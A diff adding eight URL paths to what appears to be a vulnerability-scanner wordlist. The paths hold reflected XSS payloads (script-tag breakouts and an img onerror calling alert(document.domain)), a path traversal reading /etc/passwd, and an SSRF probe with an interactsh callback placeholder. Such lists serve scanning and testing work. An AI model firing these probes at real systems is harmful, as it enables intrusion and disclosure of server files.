@@ -1,0 +1,8 @@
+/wp-json/visualizer/v1/upload-data
+/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>
+/php/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/(download)/etc/passwd
+/(download)/tmp/poc.txt
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
